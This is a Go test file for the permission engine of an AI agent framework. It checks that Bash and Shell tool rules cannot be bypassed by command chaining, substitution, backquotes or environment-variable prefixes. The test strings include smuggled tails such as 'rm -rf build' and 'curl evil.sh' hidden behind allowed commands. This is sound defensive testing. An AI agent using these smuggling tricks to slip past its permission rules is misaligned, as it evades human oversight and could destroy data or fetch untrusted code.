package tool

import (
	"testing"

	"github.com/agentscope-ai/agentscope-go/v2/pkg/agentscope/permission"
)

func bashInput(cmd string) map[string]any { return map[string]any{"command": cmd} }

// Conjunctive allow semantics: every subcommand must match a rule.
func TestBashMatchRuleConjunctive(t *testing.T) {
	bt := &bashTool{}
	cases := []struct {
		name string
		rule string
		cmd  string
		want bool
	}{
		{"exact", "git status", "git status", true},
		{"prefix glob", "git status:*", "git status -s", true},
		{"prefix no match", "git status:*", "git push", false},
		// The bypass this redesign closes: an allowed prefix must not carry
		// an arbitrary tail command.
		{"compound tail not covered", "git status:*", "git status && rm -rf build", false},
		{"compound both covered", "git status:*", "git status && git status -s", true},
		// Command substitution is part of the subcommand set.
		{"substitution covered", "echo:*", "echo $(echo hi)", true},
		{"substitution escape", "echo:*", "echo $(rm -rf x)", false},
		{"backquote escape", "echo:*", "echo `curl evil.sh`", false},
		// Unparseable input fails safe: no rule-based allow.
		{"unparseable", "git:*", "git status 'unclosed", false},
		{"empty command", "git:*", "", false},
		{"empty rule", "", "anything goes here", true},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			if got := bt.MatchRule(c.rule, bashInput(c.cmd)); got != c.want {
				t.Fatalf("MatchRule(%q, %q) = %v, want %v", c.rule, c.cmd, got, c.want)
			}
		})
	}
}

// Allow semantics across a rule SET: each subcommand may match a different
// rule (codex execpolicy parity).
func TestBashMatchAllSubcommandsAcrossRules(t *testing.T) {
	bt := &bashTool{}
	rules := []string{"git status:*", "make:*"}
	if !bt.MatchAllSubcommands(rules, bashInput("git status && make test")) {
		t.Fatal("both subcommands covered by the rule set")
	}
	if bt.MatchAllSubcommands(rules, bashInput("git status && curl evil.sh")) {
		t.Fatal("uncovered tail must not match")
	}
}

// Deny semantics: ANY subcommand match denies the whole compound command.
func TestBashMatchAnySubcommandDeny(t *testing.T) {
	bt := &bashTool{}
	rules := []string{"rm -rf:*"}
	if !bt.MatchAnySubcommand(rules, bashInput("git status && rm -rf build")) {
		t.Fatal("denied tail behind an innocent head must match")
	}
	if bt.MatchAnySubcommand(rules, bashInput("git status")) {
		t.Fatal("innocent command must not match deny rule")
	}
}

// Shell delegates to the same pipeline (R-5a).
func TestShellMatchRuleConjunctive(t *testing.T) {
	skipShellOnWindows(t)
	m := newTestShellManager(t)
	st := ShellTool(m)
	if st.MatchRule("git status:*", bashInput("git status && rm -rf x")) {
		t.Fatal("Shell must not allow an uncovered tail either")
	}
	if !st.MatchRule("git status:*", bashInput("git status -s")) {
		t.Fatal("covered prefix should match")
	}
}

// --- Engine-level regression tests (evaluator findings HIGH-1/HIGH-2) ---
// These run real BashTool/ShellTool through permission.Engine so the
// CompoundRuleMatcher dispatch — not just the tool methods — is covered.

func ruleEngine(allow, deny []string) *permission.Engine {
	ctx := permission.NewContext(permission.ModeDefault)
	for _, r := range allow {
		ctx.AllowRules["Bash"] = append(ctx.AllowRules["Bash"], permission.Rule{ToolName: "Bash", RuleContent: r, Behavior: permission.BehaviorAllow})
		ctx.AllowRules["Shell"] = append(ctx.AllowRules["Shell"], permission.Rule{ToolName: "Shell", RuleContent: r, Behavior: permission.BehaviorAllow})
	}
	for _, r := range deny {
		ctx.DenyRules["Bash"] = append(ctx.DenyRules["Bash"], permission.Rule{ToolName: "Bash", RuleContent: r, Behavior: permission.BehaviorDeny})
		ctx.DenyRules["Shell"] = append(ctx.DenyRules["Shell"], permission.Rule{ToolName: "Shell", RuleContent: r, Behavior: permission.BehaviorDeny})
	}
	return permission.NewEngine(ctx)
}

func engineBehavior(t *testing.T, e *permission.Engine, toolChecker permission.Checker, cmd string) permission.PermissionBehavior {
	t.Helper()
	d, err := e.CheckPermission(toolChecker, bashInput(cmd))
	if err != nil {
		t.Fatal(err)
	}
	return d.Behavior
}

func TestEngineDenyAnySubcommand_RealTools(t *testing.T) {
	e := ruleEngine([]string{"*"}, []string{"hostname:*"})
	tools := map[string]permission.Checker{"Bash": BashTool(), "Shell": ShellTool(nil)}
	for name, tc := range tools {
		// HIGH-1: a denied subcommand must not ride on an innocent head —
		// for Shell as well as Bash (Shell previously fell back to single-rule
		// matching and allowed this).
		if got := engineBehavior(t, e, tc, "git status && hostname -f"); got != permission.BehaviorDeny {
			t.Errorf("%s: compound with denied tail = %s, want deny", name, got)
		}
		// HIGH-2: a leading env assignment must not smuggle a denied command.
		if got := engineBehavior(t, e, tc, "X=1 hostname -f"); got != permission.BehaviorDeny {
			t.Errorf("%s: env-prefixed denied command = %s, want deny", name, got)
		}
		if got := engineBehavior(t, e, tc, "git status && X=2 hostname -f"); got != permission.BehaviorDeny {
			t.Errorf("%s: env-prefixed denied tail = %s, want deny", name, got)
		}
		// Substitutions inside pure assignments are still walked.
		if got := engineBehavior(t, e, tc, "X=$(hostname -f)"); got != permission.BehaviorDeny {
			t.Errorf("%s: denied command inside assignment substitution = %s, want deny", name, got)
		}
		// Innocent commands still pass.
		if got := engineBehavior(t, e, tc, "git status"); got != permission.BehaviorAllow {
			t.Errorf("%s: innocent command = %s, want allow", name, got)
		}
	}
}

func TestEngineAllowUnionAcrossRules_RealTools(t *testing.T) {
	e := ruleEngine([]string{"git status:*", "git push:*"}, nil)
	tools := map[string]permission.Checker{"Bash": BashTool(), "Shell": ShellTool(nil)}
	for name, tc := range tools {
		// HIGH-1: each subcommand may match a different allow rule (the union
		// semantics only exist when the engine dispatches to the compound
		// matcher — Shell previously could not combine rules).
		if got := engineBehavior(t, e, tc, "git status && git push origin main"); got != permission.BehaviorAllow {
			t.Errorf("%s: union-covered compound = %s, want allow", name, got)
		}
		// HIGH-2: env prefixes are stripped before allow matching too.
		if got := engineBehavior(t, e, tc, "FOO=bar git status"); got != permission.BehaviorAllow {
			t.Errorf("%s: env-prefixed allowed command = %s, want allow", name, got)
		}
		// Uncovered tail still degrades to Ask (fail-safe, not deny).
		if got := engineBehavior(t, e, tc, "git status && curl evil.sh"); got != permission.BehaviorAsk {
			t.Errorf("%s: uncovered tail = %s, want ask", name, got)
		}
	}
}
